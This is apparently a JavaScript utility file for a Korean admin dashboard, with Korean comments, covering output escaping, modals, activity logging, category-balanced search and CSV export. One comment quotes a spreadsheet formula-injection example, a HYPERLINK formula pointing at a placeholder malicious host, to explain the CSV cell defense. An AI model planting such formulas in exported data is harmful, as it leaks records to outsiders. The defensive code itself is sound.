/* ─────────────────────────────────────────────────────────────────────────
   admin-core.js — 어드민 공통 부품 (2026-09-12 어드민 개편 1단계)
   정본: docs/회의/2026-09-12-구현계약서-어드민개편.md 3장 1단계 · 6장 리스크 3·4·5

   ★ 선언 규칙: 전역 `function` 선언만 쓴다. `const`/`let` 전역 금지.
     별도 페이지 5개(consultations·trend-submissions·newsletter·notify·articles)가
     escapeHtml·escapeAttr·showToast 를 각자 `function` 으로 갖고 있다 —
     같은 이름의 `function` 은 뒤에 오는 것이 이겨 무해하지만,
     `const`/`let` 재선언은 SyntaxError 로 페이지가 죽는다(리스크 5).
   ★ 로드 순서: firebase-config.js 뒤, 페이지 인라인 스크립트 앞.
   ───────────────────────────────────────────────────────────────────────── */

// ── XSS 방어 — 본문 출력용 (dashboard.html 기존 escapeHtml 과 동작 동일) ──
function escapeHtml(text) {
    var div = document.createElement('div');
    div.textContent = String(text == null ? '' : text);
    return div.innerHTML;
}

// ── XSS 방어 — 속성값 출력용. 검수대장 A-011 원인(따옴표 미이스케이프) ──
//    escapeHtml 은 &,<,> 만 바꾸므로 `attr="${…}"` 안에서는 반드시 이것을 쓴다.
function escapeAttr(text) {
    return escapeHtml(text).replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

// ── 다국어 — lang.js 가 동적 요소를 다시 훑지 않으므로 현재 언어 텍스트 + 속성 짝을 같이 찍는다 ──
function admLang() { return document.documentElement.lang === 'ko' ? 'ko' : 'en'; }
function t(en, ko) { return admLang() === 'ko' ? ko : en; }
function tAttr(en, ko) { return 'data-en="' + escapeAttr(en) + '" data-ko="' + escapeAttr(ko) + '"'; }
function tSpan(en, ko) { return '<span ' + tAttr(en, ko) + '>' + escapeHtml(t(en, ko)) + '</span>'; }

// ── 어드민 초기 언어 (2026-09-12, 검수대장 A-035) — 「저장된 선택 > 기본 한국어」. lang.js 본체는 공개 페이지 공통이라 손대지 않는다.
//    lang.js pickInitialLang 순서 = 저장값('archinode-lang') > IP 캐시('archinode-lang-auto') > ko 이고, IP 조회(detectCountryAndApply)는
//    저장값이 있을 때만 건너뛴다. html/body 의 data-langs 는 언어 «목록»만 줄일 수 있어(ko 단일 = 토글 불가) 초기값·IP 조회를 못 막는다.
//    → 저장값이 없으면(또는 en/ko 가 아니면) 여기서 'ko' 를 저장해 lang.js 가 "사용자 선택" 경로를 타게 한다(IP 조회 안 함).
//      같은 브라우저의 공개 페이지도 이 저장값을 읽으므로 IP 감지를 건너뛴다 — 어드민 본인 브라우저에 한한 영향.
//    document.documentElement.lang 도 지금 맞춘다 — admin-nav 의 사이드바(t())가 lang.js 의 DOMContentLoaded 보다 먼저 그려지기 때문.
function admInitLang() {
    // A-036: 과거엔 public localStorage 키('archinode-lang')에 쓰다 보니, 어드민을 한 번만 열면
    // 같은 브라우저의 공개 페이지가 IP 감지(해외 IP → en)를 영구 건너뛰고 항상 한국어로만 보이게 됐다.
    // 이제 어드민은 자기 전용 키('archinode-admin-lang')만 쓰고, lang.js의 공개 흐름은 건드리지 않는다.
    var saved = null;
    try { saved = localStorage.getItem('archinode-admin-lang') || localStorage.getItem('archinode-lang'); } catch (e) {}
    if (saved !== 'en' && saved !== 'ko') {
        saved = 'ko';
    }
    try { localStorage.setItem('archinode-admin-lang', saved); } catch (e) {}
    document.documentElement.lang = saved;
}
admInitLang();

// ── 모달 — 기존 #modal / #modalContent 재사용, 없으면 만든다 ──
//    닫기 버튼은 closeModal 이름을 부르지 않고 직접 닫는다(별도 페이지가 window.closeModal 을
//    자기 #modalOverlay 용으로 덮어쓰므로 이름 호출이면 엉뚱한 요소를 닫는다).
function admModalEl() {
    var el = document.getElementById('modal');
    if (el) return el;
    el = document.createElement('div');
    el.className = 'modal-overlay adm-modal-overlay';
    el.id = 'modal';
    el.innerHTML = '<div class="modal adm-modal">'
        + '<button class="close-btn adm-modal-close" type="button" aria-label="Close">&times;</button>'
        + '<div id="modalContent"></div></div>';
    el.addEventListener('click', function (e) { if (e.target === e.currentTarget) el.classList.remove('show'); });
    el.querySelector('.adm-modal-close').addEventListener('click', function () { el.classList.remove('show'); });
    document.body.appendChild(el);
    return el;
}
function openModal(html) {
    var el = admModalEl();
    var content = document.getElementById('modalContent');
    if (content) content.innerHTML = html;   // 호출자가 escapeHtml 을 마친 HTML 을 넘긴다
    el.classList.add('show');
}
// R-047: Esc 로도 닫는다. 지금까지는 오른쪽 위 작은 × 하나뿐이라, 키보드로 일하는 담당자나
// 그 단추를 못 찾은 사람이 막혔다. 문서 하나에만 걸어 두면 #modal 을 쓰는 모든 어드민 화면이
// 함께 얻는다(대시보드·BIM 요청·뉴스레터·디지털 알림). #modalOverlay 를 쓰는 세 화면
// (아티클·자문·트렌드 투고)은 자기 Esc 처리가 이미 있어 건드리지 않는다.
if (typeof document !== 'undefined' && !window.__admEscBound) {
    window.__admEscBound = true;
    document.addEventListener('keydown', function (e) {
        if (e.key !== 'Escape' && e.key !== 'Esc') return;
        var el = document.getElementById('modal');
        if (el && el.classList.contains('show')) {
            el.classList.remove('show');
            e.stopPropagation();
        }
    });
}

function closeModal() {
    var el = document.getElementById('modal');
    if (el) el.classList.remove('show');
}

// ── 토스트 — 별도 페이지 5개의 showToast 와 같은 모양(#toast, .toast.show, kind: success|error) ──
function showToast(msg, kind) {
    var el = document.getElementById('toast');
    if (!el) {
        el = document.createElement('div');
        el.id = 'toast';
        document.body.appendChild(el);
    }
    el.textContent = msg;
    el.className = 'toast adm-toast show' + (kind ? ' ' + kind : '');
    clearTimeout(el._admTimer);
    el._admTimer = setTimeout(function () { el.classList.remove('show'); }, 3000);
}

// ── 날짜 — 로컬 기준 YYYY-MM-DD HH:mm. toISOString 금지(UTC 라 한국 새벽에 하루 전이 된다) ──
function fmtDate(ts) {
    if (!ts) return '';
    var d = (ts && typeof ts.toDate === 'function') ? ts.toDate() : new Date(ts);
    if (isNaN(d.getTime())) return '';
    var p = function (n) { return (n < 10 ? '0' : '') + n; };
    return d.getFullYear() + '-' + p(d.getMonth() + 1) + '-' + p(d.getDate()) + ' ' + p(d.getHours()) + ':' + p(d.getMinutes());
}

// ── URL 가드 — http(s) 만 통과 (javascript: 차단, 검수관리 rvSafeUrl 과 같은 방식) ──
function safeUrl(u) {
    return (u && /^https?:\/\//i.test(String(u))) ? String(u) : '';
}

// ── 활동 로그 — adminLogs 컬렉션에 덧붙인다 (2026-09-12 개편 2단계, 계약서 4-1 필드 그대로) ──
//    entry = { action, target:{col,id,label}, from, to, note }. by·at·page 는 여기서 채운다.
//    ★ 실패해도 화면 흐름을 막지 않는다 — try/catch + 콘솔 warn + 토스트 한 줄(조용한 실패 방지).
//    db 가 없으면 아무것도 안 한다. 오프라인이면 add() 가 대기 상태라 catch 가 안 온다(검수대장 A-010 계열).
function logAdmin(entry) {
    if (typeof db === 'undefined' || !db || typeof firebase === 'undefined') return;
    try {
        var e = entry || {};
        var tg = e.target || {};
        var page = (location.pathname.split('/').pop() || '').replace(/\.html$/i, '') || 'dashboard';   // 'dashboard' | 'consultations' | …
        return db.collection('adminLogs').add({
            at: firebase.firestore.FieldValue.serverTimestamp(),
            by: (typeof auth !== 'undefined' && auth.currentUser && auth.currentUser.email) || '',
            action: String(e.action || ''),
            target: { col: String(tg.col || ''), id: String(tg.id || ''), label: String(tg.label == null ? '' : tg.label) },
            from: e.from == null ? '' : String(e.from),
            to: e.to == null ? '' : String(e.to),
            note: e.note == null ? '' : String(e.note),
            page: page
        }).catch(function (err) { logAdmin_fail(err); });
    } catch (err) { logAdmin_fail(err); }
}
function logAdmin_fail(err) {
    console.warn('[adminLogs] 기록 실패', err);
    showToast(t('Activity log failed — see dev note', '활동 기록 실패 — 개발 메모 참조'), 'warn');
}

// ── 검색 — 여러 단어 AND 부분일치, 대소문자 무시 (6단계 통합 검색용) ──
function matchText(hay, q) {
    var words = String(q == null ? '' : q).trim().toLowerCase().split(/\s+/).filter(Boolean);
    if (!words.length) return true;
    var h = String(hay == null ? '' : hay).toLowerCase();
    for (var i = 0; i < words.length; i++) {
        if (h.indexOf(words[i]) === -1) return false;
    }
    return true;
}

/* ── CSV 셀 한 칸 — 수식 주입 방어 + 따옴표 처리 (A-201 / CWE-1236) ─────────
   엑셀·구글 시트는 `=` `+` `-` `@` 로 시작하는 셀을 **수식으로 실행**한다.
   `=HYPERLINK("http://악성/"&A1)` 처럼 쓰면 담당자가 CSV 를 여는 순간
   내보낸 데이터가 외부로 나갈 수 있다. 가입·신청 폼은 누구나 통과하므로
   이름·회사명·프로젝트명은 공격자가 고르는 값으로 봐야 한다.

   방어: 앞에 작은따옴표를 붙인다. 엑셀·시트는 그 따옴표를 '이건 글자'
   표시로 읽고 화면에 보여주지 않으므로, 사람이 읽는 내용은 그대로다.
   탭(0x09)·CR(0x0D) 도 같은 취급을 받으므로 함께 막는다.

   `-` 때문에 음수가 글자로 바뀐다. 이 내보내기들은 연락처·회사명 표라
   계산할 숫자가 없어 그 대가를 받아들였다. 숫자를 내보내는 CSV 가
   생기면 그 열만 예외로 두는 게 아니라 **열 종류를 받는 인자**를 더해야
   한다 — 값만 보고는 의도를 알 수 없기 때문이다.
   ──────────────────────────────────────────────────────────────────── */
function csvCell(value) {
    var s = String(value == null ? '' : value);
    if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;                                   // 수식으로 읽히지 않게
    if (s.indexOf(',') !== -1 || s.indexOf('"') !== -1 || s.indexOf('\n') !== -1) s = '"' + s.replace(/"/g, '""') + '"';
    return s;
}

// ── CSV 내려받기 — admin/newsletter-subscribers.html 의 downloadCSV 를 일반화해 올린 것 (6단계, view-users.js 가 쓴다) ──
//    rows = [[셀, …], …] (첫 행이 머리글). 쉼표·따옴표·줄바꿈은 따옴표로 감싼다. UTF-8 BOM(엑셀). 토스트는 호출자가.
//    ★ 뉴스레터·디지털 알림 페이지는 자기 downloadCSV()(인자 없음) 를 계속 쓴다 — 뒤 `function` 선언이 이긴다.
function downloadCSV(rows, filename) {
    var csv = (rows || []).map(function (r) {
        return (r || []).map(csvCell).join(',');   // A-201 — 수식 주입 방어는 csvCell 한 곳에서
    }).join('\n');
    var blob = new Blob(['\uFEFF' + csv], { type: 'text/csv;charset=utf-8;' });
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = filename || 'archinode-export.csv';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

// ── 통합 검색 캐시 (6단계) — 각 화면이 이미 읽은 배열을 이름으로 등록한다. 검색은 이것만 뒤진다(추가 읽기 없음 — 리스크 7).
//    dashboard.html loadBrands/loadProducts/loadArticles/loadReview · view-leads.js leads_load · view-users.js users_load
//    · view-notices.js notices_load · view-inquiries.js inquiries_load(검수대장 A-041) 가 등록.
//    `var` 는 별도 페이지가 같은 이름을 다시 선언해도 무해(const/let 만 SyntaxError — 리스크 5).
var adm_caches = {};
function admRegisterCache(name, arr) { adm_caches[String(name)] = Array.isArray(arr) ? arr : []; }
function admGetCache(name) { return adm_caches.hasOwnProperty(String(name)) ? adm_caches[String(name)] : null; }

// ── 검색 대상 정의 — 종류 뱃지 · 사이드바 항목(id) · 상세 함수 이름(없으면 화면만) · 라벨/부제/검색 본문 ──
//    부제: 브랜드=국가/카테고리, 제품=브랜드·카테고리, 아티클=브랜드·태그, 리드=유형/상태, 회원=회사, 검수=상태, 공지=대상/노출, 문의=보낸 사람/상태.
//    hay 에 이메일이 들어가는 건 검색용일 뿐 — 결과에는 이름·회사만 찍는다(개인정보는 상세에서).
/* A-415(2026-11-09): brands.category 는 **배열**이다(list-your-brand.html:783 이
   체크박스를 map 해서 쓴다). 여기는 문자열로 다뤄서 `"Furniture,Lighting"` 처럼
   쉼표가 붙은 원문 슬러그가 그대로 손님 화면에 찍혔다. A-397 에서 search.js 의
   같은 결함을 고치면서 **읽는 자리를 전수로 세지 않은** 탓이다. 배열·문자열 둘 다 받는다. */
function admCatText(v) {
    return (Array.isArray(v) ? v : String(v == null ? '' : v).split(','))
        .map(function (x) { return String(x == null ? '' : x).trim(); })
        .filter(Boolean).join(' \u00b7 ');
}

var ADM_SEARCH_SOURCES = [
    { key: 'brands',       en: 'Brand',   ko: '브랜드', cls: 'adm-kind-brand',   menu: 'brands',   view: 'viewBrand',
      label: function (d) { return d.brandName || d.id; },
      sub:   function (d) { return [d.country, admCatText(d.category)].filter(Boolean).join(' / '); },
      hay:   function (d) { return [d.brandName, d.country, admCatText(d.category), d.contactName, d.email, d.slug, d.status].join(' '); } },
    { key: 'products',     en: 'Product', ko: '제품',   cls: 'adm-kind-product', menu: 'products', view: '',
      label: function (d) { return d.name || d.id; },
      sub:   function (d) { return [d.brandName, d.category].filter(Boolean).join(' · '); },
      hay:   function (d) { return [d.name, d.brandName, d.category, d.subcategory, d.collection, d.materials, d.status].join(' '); } },
    { key: 'articles',     en: 'Article', ko: '아티클', cls: 'adm-kind-article', menu: 'articles', view: 'viewArticle',
      label: function (d) { return d.title || d.id; },
      sub:   function (d) { return [d.brandName, d.tag].filter(Boolean).join(' · '); },
      hay:   function (d) { return [d.title, d.brandName, d.tag, d.status].join(' '); } },
    { key: 'leads',        en: 'Lead',    ko: '리드',   cls: 'adm-kind-lead',    menu: 'leads',    view: 'lead_view',
      label: function (d) { return (d.name || '-') + (d.company ? ' / ' + d.company : ''); },
      sub:   function (d) { return [d.type, d.status].filter(Boolean).join(' / '); },
      hay:   function (d) { return [d.name, d.company, d.email, d.phone, d.productName, d.brandName, d.type, d.status].join(' '); } },
    { key: 'users',        en: 'Member',  ko: '회원',   cls: 'adm-kind-user',    menu: 'members',  view: 'usr_view',
      label: function (d) { return d.displayName || d.id; },
      sub:   function (d) { return d.company || ''; },
      hay:   function (d) { return [d.displayName, d.company, d.jobTitle, d.industry, d.email].join(' '); } },
    { key: 'reviewIssues', en: 'Review',  ko: '검수',   cls: 'adm-kind-review',  menu: 'review',   view: 'viewReview',
      label: function (d) { return (d.no || '-') + ' ' + (d.area || ''); },
      sub:   function (d) { return d.status || ''; },
      hay:   function (d) { return [d.no, d.area, d.screen, d.action, d.gap, d.status].join(' '); } },
    // 공지·문의 (검수대장 A-041 — 5단계 화면이 6단계 검색 범위에 빠져 있었다). 라벨은 현재 언어 제목(다른 언어로 대체), 상세는 미리보기·보기 모달.
    //    부제의 대상·상태 라벨은 view-notices/inquiries.js 의 메타 함수가 있으면 그것으로(dashboard.html 만 로드 — 없으면 키 그대로).
    { key: 'notices',      en: 'Notice',  ko: '공지',   cls: 'adm-kind-notice',  menu: 'notices',   view: 'ntc_preview',
      label: function (d) { return t(d.title_en || d.title_ko, d.title_ko || d.title_en) || d.id; },
      sub:   function (d) { var a = (typeof ntc_audienceMeta === 'function') ? ntc_audienceMeta(d.audience) : null;
                            return [a ? t(a.en, a.ko) : (d.audience || ''), d.visible ? t('Visible', '노출') : t('Hidden', '숨김')].filter(Boolean).join(' / '); },
      hay:   function (d) { return [d.title_en, d.title_ko, d.body_en, d.body_ko, d.audience, d.visible ? 'visible 노출' : 'hidden 숨김', d.updatedBy].join(' '); } },
    { key: 'inquiries',    en: 'Inquiry', ko: '문의',   cls: 'adm-kind-inquiry', menu: 'inquiries', view: 'inq_view',
      label: function (d) { return d.subject || d.id; },
      sub:   function (d) { var s = (typeof inq_statusMeta === 'function') ? inq_statusMeta(d.status) : null;
                            return [d.fromName, s ? t(s.en, s.ko) : (d.status || '')].filter(Boolean).join(' / '); },
      hay:   function (d) { return [d.subject, d.body, d.fromName, d.fromEmail, d.fromRole, d.status, d.answer].join(' '); } }
];
var ADM_SEARCH_MAX = 30;

// ── 통합 검색 — 등록된 캐시만, 여러 단어 AND · 부분일치 · 대소문자 무시(matchText), 최대 30건.
//    별도 페이지 컬렉션(자문·투고·뉴스레터·알림·아티클 카드형)은 ADMIN_MENUS 의 page 항목을 라벨로 맞춰 "이동" 항목 하나.
//    반환: [{ kind, en, ko, cls, id, label, sub, menu, view, href, (page 만) labelKo, subKo }] — 값은 원문(이스케이프는 그리는 쪽 admin-nav.js 가 한다).
function searchAll(q) {
    var query = String(q == null ? '' : q).trim();
    var out = [];
    out.totalMatches = 0;
    out.truncated = false;
    if (!query) return out;

    /* ── 1단계: 카테고리별로 따로 모은다 ────────────────────────────────
       R-066(=A-203) 이전에는 소스 배열 순서대로 하나의 `out` 을 30건까지
       채우고 멈췄다. 그래서 6번째인 `reviewIssues`(65건, 계속 증가)가
       "검토대기" 같은 흔한 낱말로 30칸을 전부 먹으면, 뒤에 있는 공지·문의·
       페이지는 **매치 여부를 검사조차 받지 못했다.** 목록이 자랄수록 뒤
       카테고리가 점점 더 안 보이는 구조였다.

       각 통은 전체 상한만큼만 담되 **진짜 매치 수는 끝까지 센다** — 사용자에게
       "몇 건 중 몇 건" 을 말해 주려면 실제 수를 알아야 한다. */
    var buckets = [];
    for (var s = 0; s < ADM_SEARCH_SOURCES.length; s++) {
        var src = ADM_SEARCH_SOURCES[s];
        var list = admGetCache(src.key);
        if (!list) continue;   // 그 화면을 아직 안 열었으면 건너뛴다(읽지 않는다)
        var hits = [], total = 0;
        for (var i = 0; i < list.length; i++) {
            var d = list[i] || {};
            if (!matchText(src.hay(d), query)) continue;
            total++;
            if (hits.length < ADM_SEARCH_MAX) {
                hits.push({ kind: src.key, en: src.en, ko: src.ko, cls: src.cls, id: String(d.id || ''),
                            label: String(src.label(d) || ''), sub: String(src.sub(d) || ''),
                            menu: src.menu, view: src.view, href: '' });
            }
        }
        if (total) buckets.push({ hits: hits, total: total });
    }
    // 페이지 이동 항목도 하나의 통으로 — 전에는 맨 뒤라 남는 자리만 받았다.
    if (typeof ADMIN_MENUS !== 'undefined') {
        var pageHits = [];
        for (var g = 0; g < ADMIN_MENUS.length; g++) {
            var items = ADMIN_MENUS[g].items || [];
            for (var k = 0; k < items.length; k++) {
                var it = items[k];
                if (it.kind !== 'page' || !it.ready) continue;
                if (!matchText(it.en + ' ' + it.ko + ' ' + it.id, query)) continue;
                pageHits.push({ kind: 'page', en: 'Page', ko: '페이지', cls: 'adm-kind-page', id: it.id,
                                label: it.en, labelKo: it.ko, sub: 'Go to page', subKo: '페이지로 이동',
                                menu: it.id, view: '', href: it.target });
            }
        }
        if (pageHits.length) buckets.push({ hits: pageHits, total: pageHits.length });
    }

    /* ── 2단계: 돌아가며 한 건씩 배정한다 ──────────────────────────────
       한 통이 상한을 독차지하지 못한다. 매치가 있는 카테고리는 **적어도 한
       건은 반드시** 자리를 얻고, 남는 자리는 많이 가진 쪽이 더 받는다.
       배정은 돌아가며 하지만 **출력은 카테고리 순서대로 묶는다** — 목록이
       카테고리별로 읽히는 지금 모양을 바꾸지 않으려고. */
    var take = [], remaining = ADM_SEARCH_MAX, anyLeft = true, b;
    for (b = 0; b < buckets.length; b++) take.push(0);
    while (remaining > 0 && anyLeft) {
        anyLeft = false;
        for (b = 0; b < buckets.length && remaining > 0; b++) {
            if (take[b] >= buckets[b].hits.length) continue;
            take[b]++; remaining--; anyLeft = true;
        }
    }
    for (b = 0; b < buckets.length; b++) {
        out.totalMatches += buckets[b].total;
        for (var j = 0; j < take[b]; j++) out.push(buckets[b].hits[j]);
    }
    out.truncated = out.totalMatches > out.length;
    return out;
}
// 검색창 안내용 — 등록된 캐시 이름 목록(아직 안 연 화면은 검색에 안 잡힌다는 것을 사용자가 알게)
function admSearchLoadedKinds() {
    var loaded = [], missing = [];
    for (var s = 0; s < ADM_SEARCH_SOURCES.length; s++) {
        (admGetCache(ADM_SEARCH_SOURCES[s].key) ? loaded : missing).push(ADM_SEARCH_SOURCES[s]);
    }
    return { loaded: loaded, missing: missing };
}

// ── 앱 설치(PWA)용 서비스워커 등록 (2026-09-12) — admin/sw.js 는 캐시를 하지 않는다(그 파일 주석 참고).
//    6개 어드민 페이지가 전부 admin/ 안이라 상대경로 'sw.js' 가 같다. https·localhost 에서만 동작하고
//    실패해도 어드민에는 영향이 없으므로 console.warn 만 남긴다(오류 던지지 않음).
if ('serviceWorker' in navigator) {
    window.addEventListener('load', function () {
        navigator.serviceWorker.register('sw.js', { scope: '/admin/' })
            .catch(function (e) { console.warn('[ARCHINODE admin] 서비스워커 등록 실패', e); });
    });
}


/* ── 권한 없음 안내 화면 (A-202 / R-068) ─────────────────────────────────
   로그인은 돼 있지만 관리자가 아닌 계정이 어드민 주소로 들어왔을 때.

   고친 것 두 가지.
   ① `dashboard.html` 만 `alert('Access denied. Admin only.')` 를 띄우고
      `auth.signOut()` 까지 했다. 나머지 6개 페이지는 안내만 하고 세션을
      건드리지 않았다 — 일곱 페이지가 서로 다르게 행동했다.
      **세션은 그대로 둔다.** 이 계정은 인증은 됐고 권한만 없다. 실제
      권한은 `firestore.rules` 의 `isAdmin()` 이 막으므로 클라이언트에서
      로그아웃시켜 얻는 보안은 없고, 전문가 회원은 주소를 잘못 눌렀다는
      이유로 하던 일을 잃는다. 관리자 자격을 박탈했을 때 세션까지 끊어야
      한다면 그건 Firebase 토큰 폐기로 할 일이고, 이 분기가 할 일이 아니다.
   ② 나머지 6개의 안내문은 영어 전용이었다("Access Denied" / "restricted
      to ARCHINODE editorial team"). 한국어·영어 짝으로 바꾸고, 같은 문구가
      6곳에 복사돼 있던 것을 여기 한 곳으로 모았다.

   돌아갈 곳을 준다 — 홈과 내 계정. 막다른 화면으로 끝내지 않는다.
   ──────────────────────────────────────────────────────────────────── */
function admAccessDenied(email) {
    /* `document.body.innerHTML = …` 로 갈아끼우지 않는다. 그러면 페이지 아래쪽
       스크립트가 나중에 찾는 요소(#csvBtn 등)가 사라져 콘솔에 TypeError 가 쌓이고,
       그 스크립트 블록의 나머지 등록도 거기서 멈춘다. 대신 body 직속 요소를 모두
       숨기고 안내만 덧붙인다 — DOM 은 남고 화면에는 안내만 보인다.
       #adminContent 만 숨기면 안 된다: 상단바와 aside#adminSidebar 가 그 밖에 있어
       어드민 메뉴 구조가 비관리자에게 그대로 노출된다 (6개 페이지 실측). */
    var kids = document.body.children;
    for (var i = 0; i < kids.length; i++) {
        var tag = kids[i].tagName;
        if (tag === 'SCRIPT' || tag === 'STYLE' || tag === 'TEMPLATE' || tag === 'LINK') continue;
        kids[i].style.display = 'none';
    }
    var box = document.createElement('div');
    var who = email
        ? '<p class="adm-denied-who">' + tSpan('Signed in as', '로그인된 계정') + ' <strong>' + escapeHtml(email) + '</strong></p>'
        : '';
    box.innerHTML =
        '<div class="adm-denied">'
      +   '<i class="fas fa-lock adm-denied-icon" aria-hidden="true"></i>'
      +   '<h1 ' + tAttr('Admin access only', '관리자 전용 화면입니다') + '>' + escapeHtml(t('Admin access only', '관리자 전용 화면입니다')) + '</h1>'
      +   '<p ' + tAttr('This page is for the ARCHINODE team. Your account is still signed in — nothing has changed.',
                        '이 화면은 아키노드 운영팀용입니다. 로그인은 그대로 유지되니 하던 일을 이어서 하실 수 있습니다.') + '>'
      +     escapeHtml(t('This page is for the ARCHINODE team. Your account is still signed in — nothing has changed.',
                         '이 화면은 아키노드 운영팀용입니다. 로그인은 그대로 유지되니 하던 일을 이어서 하실 수 있습니다.')) + '</p>'
      +   who
      +   '<div class="adm-denied-actions">'
      +     '<a class="adm-denied-btn adm-denied-btn-main" href="../index.html" ' + tAttr('Go to homepage', '홈으로') + '>' + escapeHtml(t('Go to homepage', '홈으로')) + '</a>'
      +     '<a class="adm-denied-btn" href="../auth/profile.html" ' + tAttr('My account', '내 계정') + '>' + escapeHtml(t('My account', '내 계정')) + '</a>'
      +   '</div>'
      + '</div>';
    document.body.appendChild(box);
}
